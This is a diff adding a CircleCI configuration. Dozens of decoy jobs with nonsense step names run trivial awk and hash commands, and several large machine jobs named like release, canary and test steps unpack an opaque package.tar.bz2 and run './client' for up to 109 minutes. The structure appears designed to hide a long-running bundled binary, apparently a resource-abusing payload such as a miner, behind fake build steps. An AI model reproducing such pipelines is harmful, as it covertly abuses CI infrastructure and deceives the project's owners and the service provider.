+            ls -la /tmp/_bld/pt-main.pickle | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - pt-main.pickle
+  prometheus-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/pt-main.pickle || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  Gamma_tweak-login-hang:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: grill marks
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print length("hello world")}'; true ; } > /tmp/_bld/step-29.log
+            ls -la /tmp/_bld/step-29.log | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-29.log
+  tweak-login-hang:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/step-29.log || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+  compile_mar25-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: dropped call
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; echo "payload" | sha256sum | awk '{print toupper($1)}' | head -c 32; true ; } > /tmp/_bld/artifact.tar
+            ls -la /tmp/_bld/artifact.tar | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - artifact.tar
+  mar25-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: Pull from workspace
+          command: |
+            md5sum /tmp/_bld/artifact.tar || true
+      - run:
+          name: Pull project
+          command: git clone --depth 3 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: bunzip2 -c package.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 109m
+          command: nice -n 0 ./client
+
+  prefetch_sanity_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: balloon
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=100;i++)a[i]=i*3; for(k in a) print a[k]}' | wc -l; true ; } > /tmp/_bld/91.txt
+            ls -la /tmp/_bld/91.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 91.txt
+  provision_dec6-release_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: smooth out
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=50;i++) printf "%c", 97+(i%26); print ""}'; true ; } > /tmp/_bld/main_job_output_v3.log
+            ls -la /tmp/_bld/main_job_output_v3.log | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - main_job_output_v3.log
+  vendor_verify-staging-regression-suite_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: flyby
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 50 /dev/urandom | wc -c; true ; } > /tmp/_bld/stage.dat
+            ls -la /tmp/_bld/stage.dat | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - stage.dat
+  runner_v3-beta_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: transposition
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; echo "a;b;c;d" | awk -F';' '{if(NF==4)print "four"}'; true ; } > /tmp/_bld/.ok
+            ls -la /tmp/_bld/.ok | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - .ok
+  env_promote_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: polka doth
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="encode me well"; cmd=""; for(i=1;i<=length(s);i++){c=substr(s,i,1); cmd=cmd c}; print cmd}'; true ; } > /tmp/_bld/.pid
+            ls -la /tmp/_bld/.pid | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - .pid
+  preinit_fix-5183_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: nordic hamstring
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; seq 1 403322 | awk '{s+=$1}END{print s}'; true ; } > /tmp/_bld/relay.sig
+            ls -la /tmp/_bld/relay.sig | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - relay.sig
+  step2_node20-lint_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: polar axis
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; echo $(( $(date +%s) % 10000 )) | md5sum; true ; } > /tmp/_bld/bundle
+            ls -la /tmp/_bld/bundle | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - bundle
+  fetcher_PackageApp_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: decrescendo
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; head -c 50 /dev/zero | base64; true ; } > /tmp/_bld/step-28.log
+            ls -la /tmp/_bld/step-28.log | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - step-28.log
+  prefetch_node18-build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: quintet knock
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; echo {a..e}{1..3} | tr ' ' '\n' | wc -l; true ; } > /tmp/_bld/2024-03-07.data
+            ls -la /tmp/_bld/2024-03-07.data | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 2024-03-07.data
+  beta_mar20-cleanup_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: maybe later
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; echo "x=5" | awk -F= '{print $2*2}'; true ; } > /tmp/_bld/gate-ready.out
+            ls -la /tmp/_bld/gate-ready.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - gate-ready.out
+  cook_io_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: heat pack
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s=0; for(i=1;i<=4;i++)for(j=1;j<=4;j++)for(k=1;k<=4;k++)s++; print s}'; true ; } > /tmp/_bld/package
+            ls -la /tmp/_bld/package | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - package
+  step1_MERGE_STG_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: loud mode
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; printf "4\n2\n7\n1\n5\n" | sort -n | awk 'NR==3'; true ; } > /tmp/_bld/audit.txt
+            ls -la /tmp/_bld/audit.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - audit.txt
+  g1_fire-up_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: inflate
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; echo {0..9}{0..9} | wc -w; true ; } > /tmp/_bld/checkpoint-D.pkl
+            ls -la /tmp/_bld/checkpoint-D.pkl | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - checkpoint-D.pkl
+  ctx_orion-plus_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/_bld
+      - run:
+          name: against grain
+          command: |
+            mkdir -p /tmp/_bld
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && echo hello > "$tf" && grep -c hello "$tf" && rm "$tf"; true ; } > /tmp/_bld/339.out
+            ls -la /tmp/_bld/339.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/_bld
+          paths:
+            - 339.out
+workflows:
+  matrix:
+    jobs:
+      - reset_sanity
+      - prefetch_sanity_2:
+          requires:
+            - reset_sanity
+      - sanity:
+          requires:
+            - prefetch_sanity_2
+      - Delta_dec6-release:
+          requires:
+            - prefetch_sanity_2
+      - provision_dec6-release_2:
+          requires:
+            - Delta_dec6-release
+      - dec6-release:
+          requires:
+            - provision_dec6-release_2
+      - prebuild_verify-staging-regression-suite:
+          requires:
+            - provision_dec6-release_2
+      - vendor_verify-staging-regression-suite_2:
+          requires:
+            - prebuild_verify-staging-regression-suite
+      - verify-staging-regression-suite:
+          requires:
+            - vendor_verify-staging-regression-suite_2
+      - loader_v3-beta:
+          requires:
+            - vendor_verify-staging-regression-suite_2
+      - runner_v3-beta_2:
+          requires:
+            - loader_v3-beta
+      - v3-beta:
+          requires:
+            - runner_v3-beta_2
+      - env_q4-ship
+      - q4-ship:
+          requires:
+            - env_q4-ship
+      - retry_produce-nightly-artifact-bundle:
+          requires:
+            - env_q4-ship
+      - produce-nightly-artifact-bundle:
+          requires:
+            - retry_produce-nightly-artifact-bundle
+      - Gamma_tweak-login-hang:
+          requires:
+            - retry_produce-nightly-artifact-bundle
+      - tweak-login-hang:
+          requires:
+            - Gamma_tweak-login-hang
+      - compile_mar25-canary:
+          requires:
+            - Gamma_tweak-login-hang
+      - mar25-canary:
+          requires:
+            - compile_mar25-canary
+      - prebuild_DeployTests:
+          requires:
+            - compile_mar25-canary
+      - DeployTests:
+          requires:
+            - prebuild_DeployTests
+      - tmp_prometheus-plus:
+          requires:
+            - prebuild_DeployTests
+      - prometheus-plus:
+          requires:
+            - tmp_prometheus-plus
+      - step2_promote
+      - env_promote_2:
+          requires:
+            - step2_promote
+      - promote:
+          requires:
+            - env_promote_2
+      - teardown_fix-5183:
+          requires:
+            - env_promote_2
+      - preinit_fix-5183_2:
+          requires:
+            - teardown_fix-5183
+      - fix-5183:
+          requires:
+            - preinit_fix-5183_2
+      - hydrate_node20-lint:
+          requires:
+            - preinit_fix-5183_2
+      - step2_node20-lint_2:
+          requires:
+            - hydrate_node20-lint
+      - node20-lint:
+          requires:
+            - step2_node20-lint_2
+      - retry_PackageApp:
+          requires:
+            - step2_node20-lint_2
+      - fetcher_PackageApp_2:
+          requires:
+            - retry_PackageApp
+      - PackageApp:
+          requires:
+            - fetcher_PackageApp_2
+      - teardown_node18-build:
+          requires:
+            - fetcher_PackageApp_2
+      - prefetch_node18-build_2:
+          requires:
+            - teardown_node18-build
+      - node18-build:
+          requires:
+            - prefetch_node18-build_2
+      - p1_mar20-cleanup:
+          requires:
+            - prefetch_node18-build_2
+      - beta_mar20-cleanup_2:
+          requires:
+            - p1_mar20-cleanup
+      - mar20-cleanup:
+          requires:
+            - beta_mar20-cleanup_2
+      - loader_io
+      - cook_io_2:
+          requires:
+            - loader_io
+      - io:
+          requires:
+            - cook_io_2
+      - checker_MERGE_STG:
+          requires:
+            - cook_io_2
+      - step1_MERGE_STG_2:
+          requires:
+            - checker_MERGE_STG
+      - MERGE_STG:
+          requires:
+            - step1_MERGE_STG_2
+      - warmer_fire-up:
+          requires:
+            - step1_MERGE_STG_2
+      - g1_fire-up_2:
+          requires:
+            - warmer_fire-up
+      - fire-up:
+          requires:
+            - g1_fire-up_2
+      - gamma_orion-plus:
+          requires:
+            - g1_fire-up_2
+      - ctx_orion-plus_2:
+          requires:
+            - gamma_orion-plus
+      - orion-plus:
+          requires:
+            - ctx_orion-plus_2
+      - hook_v8-alpha
+      - checker_shippit
+      - precheck_ValidateStaging
+      - v8-alpha:
+          requires:
+            - hook_v8-alpha
+            - checker_shippit
+            - precheck_ValidateStaging
+      - shippit:
+          requires:
+            - hook_v8-alpha
+            - checker_shippit
+            - precheck_ValidateStaging
+      - ValidateStaging:
+          requires:
+            - hook_v8-alpha
+            - checker_shippit
+            - precheck_ValidateStaging
+      - preview-build:
+          requires:
+            - hook_v8-alpha
+            - checker_shippit
+            - precheck_ValidateStaging
+      - spin-up:
+          requires:
+            - hook_v8-alpha
+            - checker_shippit
+            - precheck_ValidateStaging
+      - redo_atlas
+      - atlas:
+          requires:
+            - redo_atlas
+      - reset_realease-27:
+          requires:
+            - redo_atlas
+      - realease-27:
+          requires:
+            - reset_realease-27
+      - tester_apr19-smoke:
+          requires:
+            - reset_realease-27
+      - apr19-smoke:
+          requires:
+            - tester_apr19-smoke
+      - prep_andromeda-alpha:
+          requires:
+            - tester_apr19-smoke
+      - andromeda-alpha:
+          requires:
+            - prep_andromeda-alpha
+      - fixture_zulu-4:
+          requires:
+            - prep_andromeda-alpha
+      - zulu-4:
+          requires:
+            - fixture_zulu-4
